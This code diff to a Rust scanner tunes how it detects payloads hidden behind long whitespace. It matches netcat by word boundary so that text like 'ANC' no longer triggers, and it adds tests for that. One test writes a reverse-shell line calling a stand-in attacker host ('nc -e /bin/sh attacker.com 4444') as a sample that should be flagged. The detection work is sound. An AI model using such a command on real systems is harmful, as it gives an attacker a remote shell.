@@ -101,7 +101,6 @@ const SUSPICIOUS_PATTERNS: &[&str] = &[
     // Shell commands
     "curl ",
     "wget ",
-    "nc ",
     "bash ",
     "/bin/sh",
     "/bin/bash",
@@ -116,6 +115,36 @@ const SUSPICIOUS_PATTERNS: &[&str] = &[
     "\\x",
     "\\u00",
 ];
+
+/// Patterns that require word-boundary matching to avoid false positives.
+/// These are checked with `has_word_boundary_match` — the pattern must appear as a
+/// standalone word (preceded by start-of-string, whitespace, or punctuation).
+const WORD_BOUNDARY_PATTERNS: &[&str] = &[
+    "nc ", // netcat — but not "ANC", "dance", etc.
+    "nc\t",
+];
+
+/// Check if any pattern appears as a standalone word in the text.
+/// A "word boundary" here means the pattern is at the start of the string or
+/// preceded by a non-alphanumeric character.
+fn has_word_boundary_match(text: &str, patterns: &[&str]) -> bool {
+    for pattern in patterns {
+        let mut start = 0;
+        while let Some(pos) = text[start..].find(pattern) {
+            let abs_pos = start + pos;
+            if abs_pos == 0 {
+                return true;
+            }
+            // Check if the preceding character is non-alphanumeric (word boundary)
+            let prev_char = text[..abs_pos].chars().next_back().unwrap();
+            if !prev_char.is_alphanumeric() && prev_char != '_' {
+                return true;
+            }
+            start = abs_pos + 1;
+        }
+    }
+    false
+}
 
 /// File extensions where long lines are expected and hidden-content checks produce false positives.
 const NON_EXECUTABLE_EXTENSIONS: &[&str] = &[
@@ -228,7 +257,8 @@ pub fn scan_file(
             let hidden: String = line.chars().skip(steg_column).collect();
             if !hidden.trim().is_empty() {
                 let hidden_lower = hidden.to_lowercase();
-                let is_suspicious = SUSPICIOUS_PATTERNS.iter().any(|p| hidden_lower.contains(p));
+                let is_suspicious = SUSPICIOUS_PATTERNS.iter().any(|p| hidden_lower.contains(p))
+                    || has_word_boundary_match(&hidden_lower, &WORD_BOUNDARY_PATTERNS);
 
                 // If the visible portion has an unclosed HTML tag (< without >),
                 // the hidden content is just attribute continuation, not a payload.
@@ -518,6 +548,53 @@ mod tests {
         assert!(
             !hidden_findings.is_empty(),
             "onload= hidden in non-HTML context should still be flagged"
+        );
+    }
+
+    #[test]
+    fn test_nc_word_boundary_no_false_positive() {
+        // "ANC " should NOT trigger the "nc " pattern — it's not standalone netcat
+        let dir = tempfile::tempdir().unwrap();
+        let file_path = dir.path().join("seeder.php");
+        let mut file = std::fs::File::create(&file_path).unwrap();
+        let config = test_obfuscation_config();
+        let visible = "'body' => 'On February 11, 1990, a global television audience wa";
+        let padding = " ".repeat(config.steganographic_column - visible.len());
+        let hidden =
+            "s 71 years old. President F.W. de Klerk had unbanned the ANC and ordered release";
+        write!(file, "{}{}{}", visible, padding, hidden).unwrap();
+
+        let findings = scan_file(&file_path, &config).unwrap();
+        let hidden_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.rule_id == "obfuscation-hidden-content")
+            .collect();
+        assert!(
+            hidden_findings.is_empty(),
+            "\"ANC \" should not trigger nc word-boundary pattern"
+        );
+    }
+
+    #[test]
+    fn test_nc_standalone_still_flagged() {
+        // Standalone "nc " (netcat) should still be flagged
+        let dir = tempfile::tempdir().unwrap();
+        let file_path = dir.path().join("suspicious.sh");
+        let mut file = std::fs::File::create(&file_path).unwrap();
+        let config = test_obfuscation_config();
+        let visible = "echo 'hello'";
+        let padding = " ".repeat(config.steganographic_column - visible.len());
+        let hidden = "nc -e /bin/sh attacker.com 4444";
+        write!(file, "{}{}{}", visible, padding, hidden).unwrap();
+
+        let findings = scan_file(&file_path, &config).unwrap();
+        let hidden_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.rule_id == "obfuscation-hidden-content")
+            .collect();
+        assert!(
+            !hidden_findings.is_empty(),
+            "standalone 'nc ' (netcat) should still be flagged"
         );
     }
 
